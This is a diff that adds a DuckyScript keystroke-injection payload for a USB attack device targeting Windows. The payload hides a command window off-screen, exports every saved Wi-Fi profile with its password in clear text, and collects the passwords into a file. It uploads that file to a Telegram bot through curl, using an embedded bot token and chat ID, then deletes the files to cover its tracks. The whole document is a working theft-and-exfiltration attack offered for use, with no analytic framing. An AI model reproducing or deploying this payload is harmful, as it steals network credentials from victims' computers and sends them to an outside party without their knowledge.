@@ -1,0 +1,37 @@
+DELAY 3000
+GUI r
+DELAY 100
+STRING cmd /k mode con: cols=15 lines=1
+ENTER
+DELAY 1000
+ALT SPACE
+DELAY 100
+STRING m
+DELAY 100
+
+REM Send down arrow key 100 times
+REPEAT 100
+    DOWNARROW
+ENDREPEAT
+ENTER
+DELAY 100
+STRING cd %temp%
+ENTER
+DELAY 500
+STRING netsh wlan export profile key=clear
+ENTER
+DELAY 500
+STRING powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS.txt
+ENTER
+DELAY 500
+STRING curl -X POST "https://api.telegram.org/bot7041115900:AAHtHncvWaZAE1ED4S9XIChdfTOqP95BT4c/sendDocument" -F "chat_id=6100927257" -F "document=@Wi-Fi-PASS.txt"
+ENTER
+DELAY 1000
+STRING del Wi-* /s /f /q
+ENTER
+DELAY 100
+STRING exit
+ENTER
+DELAY 100
+
+DELAY 90000
